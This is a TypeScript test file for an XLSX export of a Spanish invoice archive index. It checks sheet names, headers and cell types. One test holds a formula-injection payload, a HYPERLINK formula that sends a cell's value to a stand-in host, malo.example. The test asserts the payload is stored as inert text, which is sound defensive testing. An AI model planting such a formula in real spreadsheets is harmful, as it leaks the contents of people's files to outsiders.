import { describe, it, expect } from "vitest";
import * as XLSX from "xlsx";
import { strFromU8, unzipSync } from "fflate";
import { ARCHIVE_INDEX_HEADERS, type ArchiveIndexCell } from "@/lib/archiveExportFormat";
import { archiveIndexXlsx } from "@/lib/archiveIndexXlsx";

const FORMULA = '=HYPERLINK("http://malo.example/?d="&A1,"Proveedor SL")';

function row(overrides: Partial<Record<(typeof ARCHIVE_INDEX_HEADERS)[number], ArchiveIndexCell>> = {}): ArchiveIndexCell[] {
  const values: Record<string, ArchiveIndexCell> = {
    "Nº de registro": "R-2026/0001",
    Periodo: "Marzo 2026",
    Tipo: "Recibida",
    Estado: "Exportada",
    "Recibida el": new Date("2026-03-05T00:00:00Z"),
    Fecha: new Date("2026-03-02T00:00:00Z"),
    "Nº de factura": "00123",
    Tercero: "Proveedor SL",
    NIF: "B12345674",
    Base: 1234.5,
    "Cuota IVA": 259.25,
    Retención: null,
    Total: -1493.75,
    "Original electrónico o en papel": "Electrónico",
    Formato: "PDF",
    "Fichero en el ZIP": "recibidas/2026-03/R-2026-0001 00123 Proveedor SL.pdf",
    "SHA-256": "ab".repeat(32),
    "Conservar hasta": new Date("2032-12-31T00:00:00Z"),
    Avisos: null,
    ...overrides,
  };
  return ARCHIVE_INDEX_HEADERS.map((header) => values[header]);
}

// Sin cellDates: con él, xlsx pasa el nº de serie a un Date en la zona del
// equipo, y el test solo pasaría en UTC. Las fechas se miran por su nº de
// serie y su formato, que no dependen de la zona.
const read = (buffer: Buffer) => XLSX.read(buffer, { cellNF: true, cellFormula: true });
/** El nº de serie de Excel de un día (1 = 01/01/1900, con el 29/02/1900 que no existió). */
const serial = (day: string) => (Date.parse(`${day}T00:00:00Z`) - Date.UTC(1899, 11, 30)) / 86_400_000;
const col = (header: (typeof ARCHIVE_INDEX_HEADERS)[number]) => XLSX.utils.encode_col(ARCHIVE_INDEX_HEADERS.indexOf(header));

describe("indice.xlsx", () => {
  it("se lee con XLSX.read: las hojas y las cabeceras exactas", () => {
    const book = read(archiveIndexXlsx([
      { name: "Recibidas", rows: [[...ARCHIVE_INDEX_HEADERS], row()] },
      { name: "Emitidas", rows: [[...ARCHIVE_INDEX_HEADERS]] },
      { name: "Sin registrar", rows: [[...ARCHIVE_INDEX_HEADERS]] },
      { name: "Rechazadas", rows: [[...ARCHIVE_INDEX_HEADERS]] },
    ]));
    expect(book.SheetNames).toEqual(["Recibidas", "Emitidas", "Sin registrar", "Rechazadas"]);
    for (const name of book.SheetNames) {
      const [headers] = XLSX.utils.sheet_to_json<string[]>(book.Sheets[name], { header: 1 });
      expect(headers).toEqual([...ARCHIVE_INDEX_HEADERS]);
    }
    expect(XLSX.utils.sheet_to_json(book.Sheets.Emitidas)).toEqual([]);
  });

  it("tipos de celda: importes como número, fechas como fecha y textos como texto", () => {
    const sheet = read(archiveIndexXlsx([{ name: "Recibidas", rows: [[...ARCHIVE_INDEX_HEADERS], row()] }])).Sheets.Recibidas;
    const at = (header: (typeof ARCHIVE_INDEX_HEADERS)[number]) => sheet[`${col(header)}2`];
    expect(at("Base")).toMatchObject({ t: "n", v: 1234.5 });
    expect(at("Total")).toMatchObject({ t: "n", v: -1493.75 });
    expect(at("Fecha")).toMatchObject({ t: "n", v: serial("2026-03-02"), z: "dd/mm/yyyy", w: "02/03/2026" });
    expect(at("Recibida el")).toMatchObject({ t: "n", v: serial("2026-03-05"), z: "dd/mm/yyyy", w: "05/03/2026" });
    expect(at("Conservar hasta")).toMatchObject({ t: "n", v: serial("2032-12-31"), z: "dd/mm/yyyy", w: "31/12/2032" });
    expect(serial("2026-03-02")).toBe(46083);
    // Un nº de factura con ceros delante sigue siendo texto.
    expect(at("Nº de factura")).toMatchObject({ t: "s", v: "00123" });
    expect(at("SHA-256")).toMatchObject({ t: "s" });
    // Lo vacío no deja celda.
    expect(at("Retención")).toBeUndefined();
    expect(at("Avisos")).toBeUndefined();
  });

  it("una fórmula dentro de un texto queda como texto (t = 's'), sin fórmula", () => {
    const buffer = archiveIndexXlsx([{ name: "Recibidas", rows: [[...ARCHIVE_INDEX_HEADERS], row({ Tercero: FORMULA, "Nº de factura": "+34-1", NIF: "@SUM(A1)" })] }]);
    const sheet = read(buffer).Sheets.Recibidas;
    for (const header of ["Tercero", "Nº de factura", "NIF"] as const) {
      const cell = sheet[`${col(header)}2`];
      expect(cell.t).toBe("s");
      expect(cell.f).toBeUndefined();
    }
    expect(sheet[`${col("Tercero")}2`].v).toBe(FORMULA);
    // Y en el XML de la hoja no hay ninguna <f>: el texto va a sharedStrings.
    const files = unzipSync(new Uint8Array(buffer));
    const sheetXml = strFromU8(files["xl/worksheets/sheet1.xml"]);
    expect(sheetXml).not.toMatch(/<f[ >]/);
    expect(sheetXml).not.toContain("HYPERLINK");
    expect(strFromU8(files["xl/sharedStrings.xml"])).toContain("HYPERLINK");
  });

  it("una hoja sin filas sigue siendo válida", () => {
    const book = read(archiveIndexXlsx([{ name: "Sin registrar", rows: [] }]));
    expect(book.SheetNames).toEqual(["Sin registrar"]);
  });
});
